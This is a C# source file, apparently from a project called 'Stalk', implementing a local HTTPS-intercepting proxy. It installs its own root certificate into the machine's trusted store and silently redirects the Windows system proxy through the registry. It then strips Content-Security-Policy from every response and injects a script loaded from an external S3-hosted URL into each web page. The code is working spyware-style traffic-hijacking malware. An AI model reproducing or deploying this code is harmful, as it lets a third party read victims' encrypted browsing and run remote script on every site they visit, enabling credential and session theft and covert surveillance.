using Microsoft.Win32;
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using Titanium.Web.Proxy;
using Titanium.Web.Proxy.EventArguments;
using Titanium.Web.Proxy.Models;


namespace Stalk
{
    class Proxy
    {
        private readonly ProxyServer proxy = new ProxyServer();
        private readonly RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true);

        [DllImport("wininet.dll")]
        private static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
        private const int INTERNET_OPTION_SETTINGS_CHANGED = 39;
        private const int INTERNET_OPTION_REFRESH = 37;

        public void Start()
        {
            EnsureRootCertificate();

            proxy.BeforeResponse += OnResponse;
            proxy.AddEndPoint(new ExplicitProxyEndPoint(IPAddress.Parse("127.0.0.1"), 1219, true));
            proxy.Start();

            key.SetValue("ProxyServer", "127.0.0.1:1219");
            key.SetValue("ProxyEnable", 1);

            InternetSetOption(IntPtr.Zero, INTERNET_OPTION_SETTINGS_CHANGED, IntPtr.Zero, 0);
            InternetSetOption(IntPtr.Zero, INTERNET_OPTION_REFRESH, IntPtr.Zero, 0);
        }

        public void Stop()
        {
            key.SetValue("ProxyEnable", 0);

            proxy.BeforeResponse -= OnResponse;
            proxy.Stop();
        }

        private void EnsureRootCertificate()
        {
            proxy.CertificateManager.LoadRootCertificate();

            if (proxy.CertificateManager.RootCertificate == null)
            {
                proxy.CertificateManager.CreateRootCertificate();
            }

            X509Store store = new X509Store(StoreName.Root, StoreLocation.LocalMachine);
            X509Certificate2 certificate = new X509Certificate2(
                proxy.CertificateManager.RootCertificate.Export(X509ContentType.Cert)
            );

            store.Open(OpenFlags.ReadWrite);
            store.Add(certificate);
            store.Close();
        }

        private async Task OnResponse(object sender, SessionEventArgs e)
        {
            e.HttpClient.Response.Headers.RemoveHeader("Content-Security-Policy");

            StringBuilder body = new StringBuilder(await e.GetResponseBodyAsString());

            body.Replace("Content-Security-Policy", "None");
            body.Replace("</head>", "<script src=\"https://stalk-scripts.s3-sa-east-1.amazonaws.com/example.js\"></script></head>");

            e.SetResponseBodyString(body.ToString());
        }
    }
}
